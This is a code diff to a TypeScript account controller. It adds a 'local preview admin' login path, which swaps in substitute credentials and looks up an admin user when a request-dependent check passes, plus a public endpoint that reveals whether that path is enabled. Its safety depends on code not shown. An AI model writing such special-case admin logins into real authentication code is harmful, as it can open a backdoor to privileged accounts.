@@ -27,6 +27,11 @@ import { Db, camel } from './db';
 import { config } from './config';
 import { fail } from './errors';
 import { mailEnabled, sendAccountMail } from './mail';
+import {
+  localPreviewAdminEnabled,
+  localPreviewLogin,
+  LOCAL_PREVIEW_ADMIN_AUDIT,
+} from './local-preview-admin';
 const scrypt = promisify(scryptCb);
 export async function hashPassword(password: string) {
   const salt = randomBytes(16).toString('hex');
@@ -129,6 +134,10 @@ export class AccountController {
   ) {
     return { user: await this.auth.current(req) };
   }
+  @Get('auth/local-preview')
+  localPreview(@Req() req: Request) {
+    return { localAdminAlias: localPreviewAdminEnabled(req, config) };
+  }
   @Post('auth/register')
   async register(
     @Body()
@@ -165,10 +174,17 @@ export class AccountController {
     @Res({ passthrough: true })
     res: Response,
   ) {
-    const b = loginSchema.parse(body);
-    const rows = await this.db.query('SELECT * FROM users WHERE email=$1 AND deleted_at IS NULL', [
-      b.email,
-    ]);
+    const local = localPreviewLogin(body, localPreviewAdminEnabled(req, config));
+    const b = local ?? loginSchema.parse(body);
+    const rows = local
+      ? await this.db.query(
+          `SELECT u.* FROM users u WHERE u.email=$1 AND u.handle='admin' AND u.role='admin'
+           AND u.deleted_at IS NULL AND EXISTS (
+             SELECT 1 FROM audit a WHERE a.action=$2 AND a.actor_id=u.id AND a.target_id=u.id::text
+           )`,
+          [b.email, LOCAL_PREVIEW_ADMIN_AUDIT],
+        )
+      : await this.db.query('SELECT * FROM users WHERE email=$1 AND deleted_at IS NULL', [b.email]);
     const hash = rows[0]?.password_hash as string | undefined;
     const valid = await verifyPassword(
       b.password,
